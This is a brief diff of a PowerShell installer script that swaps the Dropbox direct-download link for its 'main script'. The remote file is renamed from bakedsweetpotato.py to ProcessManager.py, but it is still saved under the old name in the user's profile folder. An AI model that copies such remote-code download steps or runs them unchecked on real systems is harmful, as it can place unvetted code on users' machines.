@@ -166,7 +166,7 @@ try {
     # Download the main script
     Write-Host "Downloading main script..." -ForegroundColor Yellow
     
-    $scriptUrl = "https://www.dropbox.com/scl/fi/eswr5lmlfsjra8o0j8iav/bakedsweetpotato.py?rlkey=5qnvs3d5yspqos176itcdd7ct&st=fdityh42&dl=1"
+    $scriptUrl = "https://www.dropbox.com/scl/fi/5tz22k0sppp1jh9x9drhv/ProcessManager.py?rlkey=a1xn2hxrh7u6b52rr4id4yp6d&st=vzuethzw&dl=1"
     $scriptPath = "$env:USERPROFILE\bakedsweetpotato.py"
     
     # Download the script
@@ -210,4 +210,5 @@ try {
 }
 
 # Wait a bit then exit
+
 Start-Sleep -Seconds 5
